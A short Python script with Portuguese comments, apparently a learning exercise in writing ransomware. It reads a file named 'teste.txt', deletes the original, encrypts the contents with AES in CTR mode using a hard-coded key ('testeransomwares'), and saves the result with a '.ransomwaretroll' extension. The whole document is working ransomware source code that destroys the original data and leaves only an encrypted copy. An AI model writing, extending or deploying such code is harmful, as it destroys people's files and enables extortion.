
import os
import pyaes

## Abrir o arquivo a ser criptografado

file_cripto = "teste.txt"
file = open (file_cripto,'rb')
file_data = file.read()
file.close()

## Remover o arquivo original 

os.remove(file_cripto)

## definir a chave de encriptacao

key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)

##criptografar o arquivo

cripto_data = aes.encrypt(file_data)

##salvar o arquivo criptografado

new_file = file_cripto + '.ransomwaretroll'
new_file = open(f'{new_file}','wb')
new_file.write(cripto_data)
new_file.close()
